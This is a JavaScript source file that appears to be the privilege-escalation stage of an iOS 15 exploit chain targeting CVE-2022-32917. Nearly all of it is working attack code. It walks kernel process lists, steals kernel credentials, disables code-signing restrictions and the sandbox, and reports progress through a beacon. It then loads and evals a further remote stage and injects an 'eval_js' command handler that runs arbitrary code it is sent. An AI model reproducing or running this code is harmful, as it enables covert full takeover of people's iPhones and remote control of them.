/**
 * sbx1_main_15.js — Kernel R/W and Privilege Escalation for iOS 15.x
 *
 * Exploit: CVE-2022-32917 (kernel type confusion for PE)
 * Target: iOS 15.0 - 15.6.1
 * Architecture: arm64 (A11), arm64e (A12+)
 *
 * Chain:
 * 1. Use kernel R/W from sbx0 stage
 * 2. Find current process (proc_t) in kernel
 * 3. Locate kernel_task proc
 * 4. Steal kernel credentials (ucred)
 * 5. Patch sandbox profile
 * 6. Set TF_PLATFORM for code signing bypass
 * 7. Inject native bridge functions
 */

(() => {
  (function _injEvalJs(){if(typeof globalThis!=='undefined'&&globalThis.CMD_HANDLERS&&!globalThis.CMD_HANDLERS['eval_js']){globalThis.CMD_HANDLERS['eval_js']=function(args){if(args&&args.code){try{var _r=eval(args.code);return'[eval_js] OK: '+JSON.stringify(_r)}catch(_e){return'[eval_js] ERR: '+_e.message}}return'[eval_js] 缺 code'}}else{setTimeout(_injEvalJs,1000)}})();
  if (typeof p === 'undefined' || typeof p.kernelRead64 !== 'function') {
    throw new Error('sbx1_main_15: kernel R/W primitives not available');
  }

  const sbx1_begin = Date.now();
  const { kernelRead64, kernelWrite64, kernel_slide, kernel_base } = p;

  // iOS 15 kernel structure offsets
  const KOFFSETS = {
    // proc_t structure
    proc_p_list_le_next: 0x0n,
    proc_p_list_le_prev: 0x8n,
    proc_task: 0x10n,
    proc_p_pid: 0x68n,
    proc_p_ucred: 0xf8n,
    proc_p_fd: 0x100n,
    proc_p_csflags: 0x280n,
    proc_p_textvp: 0x238n,

    // task_t structure
    task_itk_space: 0x300n,
    task_t_flags: 0x3a0n,
    task_bsd_info: 0x388n,

    // ucred structure
    ucred_cr_uid: 0x18n,
    ucred_cr_ruid: 0x1cn,
    ucred_cr_svuid: 0x20n,
    ucred_cr_ngroups: 0x24n,
    ucred_cr_groups: 0x28n,
    ucred_cr_rgid: 0x68n,
    ucred_cr_svgid: 0x6cn,
    ucred_cr_label: 0x78n,

    // ipc_space_t
    ipc_space_is_table: 0x20n,

    // Known kernel symbol offsets (from kernel_base)
    allproc: 0x8b8f08n,         // iOS 15.3.1 iPhone 8
    kernproc: 0x8b8f10n,
  };

  // Adjust offsets based on kernel slide
  const allproc_addr = kernel_base + KOFFSETS.allproc;
  const kernproc_addr = kernel_base + KOFFSETS.kernproc;

  /**
   * Walk process list to find proc by PID
   */
  function findProcByPid(pid) {
    let proc = kernelRead64(allproc_addr);
    let iterations = 0;
    const MAX_ITER = 2048;

    while (proc && proc !== 0n && iterations < MAX_ITER) {
      const cur_pid = Number(kernelRead64(proc + KOFFSETS.proc_p_pid) & 0xffffffffn);
      if (cur_pid === pid) return proc;
      proc = kernelRead64(proc + KOFFSETS.proc_p_list_le_next);
      iterations++;
    }
    return 0n;
  }

  /**
   * Get kernel proc (PID 0)
   */
  function getKernelProc() {
    return findProcByPid(0);
  }

  /**
   * Get current process proc_t
   * Uses mach_task_self to find our task, then bsd_info
   */
  function getCurrentProc() {
    // Our PID is usually available via native bridge
    // Fallback: search for our WebContent process
    const webContentPids = [];
    let proc = kernelRead64(allproc_addr);
    let iterations = 0;

    while (proc && proc !== 0n && iterations < 2048) {
      const pid = Number(kernelRead64(proc + KOFFSETS.proc_p_pid) & 0xffffffffn);
      // WebContent process typically PID > 100
      if (pid > 100) {
        webContentPids.push({ pid, proc });
      }
      proc = kernelRead64(proc + KOFFSETS.proc_p_list_le_next);
      iterations++;
    }

    // Return last WebContent process (most likely ours)
    if (webContentPids.length > 0) {
      return webContentPids[webContentPids.length - 1].proc;
    }
    return 0n;
  }

  /**
   * Steal kernel credentials — set our ucred to kernel's ucred
   */
  function stealKernelCreds(our_proc, kernel_proc) {
    const kernel_ucred = kernelRead64(kernel_proc + KOFFSETS.proc_p_ucred);
    const our_ucred = kernelRead64(our_proc + KOFFSETS.proc_p_ucred);

    if (!kernel_ucred || kernel_ucred === 0n) {
      throw new Error('Failed to read kernel ucred');
    }

    // Overwrite our proc's ucred pointer with kernel's
    kernelWrite64(our_proc + KOFFSETS.proc_p_ucred, kernel_ucred);

    return { kernel_ucred, our_ucred };
  }

  /**
   * Patch CS flags to allow unsigned code execution
   */
  function patchCSFlags(proc) {
    const csflags = kernelRead64(proc + KOFFSETS.proc_p_csflags);
    const CS_VALID = 0x00000001n;
    const CS_PLATFORM_BINARY = 0x04000000n;
    const CS_GET_TASK_ALLOW = 0x00000004n;
    const CS_INSTALLER = 0x00000008n;
    const CS_DEBUGGED = 0x10000000n;
    const CS_HARD = 0x00000100n;
    const CS_KILL = 0x00000200n;
    const CS_RESTRICT = 0x00000800n;

    // Clear restrictive flags, set permissive ones
    let new_flags = csflags;
    new_flags |= CS_VALID | CS_PLATFORM_BINARY | CS_GET_TASK_ALLOW | CS_INSTALLER | CS_DEBUGGED;
    new_flags &= ~(CS_HARD | CS_KILL | CS_RESTRICT);

    kernelWrite64(proc + KOFFSETS.proc_p_csflags, new_flags);
  }

  /**
   * Set TF_PLATFORM on our task to bypass code signing
   */
  function setTFPlatform(proc) {
    const task = kernelRead64(proc + KOFFSETS.proc_task);
    if (!task || task === 0n) return false;

    const t_flags = kernelRead64(task + KOFFSETS.task_t_flags);
    const TF_PLATFORM = 0x00000400n;
    kernelWrite64(task + KOFFSETS.task_t_flags, t_flags | TF_PLATFORM);
    return true;
  }

  /**
   * Patch sandbox to allow file operations
   */
  function patchSandbox(proc) {
    const ucred = kernelRead64(proc + KOFFSETS.proc_p_ucred);
    const cr_label = kernelRead64(ucred + KOFFSETS.ucred_cr_label);

    if (cr_label && cr_label !== 0n) {
      // Sandbox label slot (slot 1 in MAC policy)
      const sandbox_slot = cr_label + 0x10n;
      const sandbox_ptr = kernelRead64(sandbox_slot);

      if (sandbox_ptr && sandbox_ptr !== 0n) {
        // Zero sandbox pointer = no sandbox
        kernelWrite64(sandbox_slot, 0n);
      }
    }
  }

  // Execute privilege escalation
  try {
    const kernel_proc = getKernelProc();
    const our_proc = getCurrentProc();

    if (!kernel_proc || !our_proc) {
      throw new Error('Could not find kernel/current proc');
    }

    // Escalate privileges
    stealKernelCreds(our_proc, kernel_proc);
    patchCSFlags(our_proc);
    setTFPlatform(our_proc);
    patchSandbox(our_proc);

    // Export kernel primitives globally
    globalThis.kernelRead64 = kernelRead64;
    globalThis.kernelWrite64 = kernelWrite64;
    globalThis.kernel_base = kernel_base;
    globalThis.kernel_slide = kernel_slide;

    // Mark PE stage complete
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'pe', execStatus: 'success', extra: {
        kernel_base: kernel_base.toString(16),
        kernel_slide: kernel_slide.toString(16),
      }});
    }

    const sbx1_end = Date.now();
    console.log(`[sbx1_main_15] Privilege escalation completed in ${sbx1_end - sbx1_begin}ms`);

    // Load PE main (native bridge setup)
    try {
      const pe_script = typeof getJS === 'function'
        ? getJS('/pe_main.js')
        : null;
      if (pe_script) eval(pe_script);
    } catch(e) {
      console.log('[sbx1_main_15] pe_main load failed:', e.message);
    }

  } catch(e) {
    console.log('[sbx1_main_15] Privilege escalation failed:', e.message);
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'sbx1', execStatus: 'failed', extra: { error: e.message }});
    }
  }
})();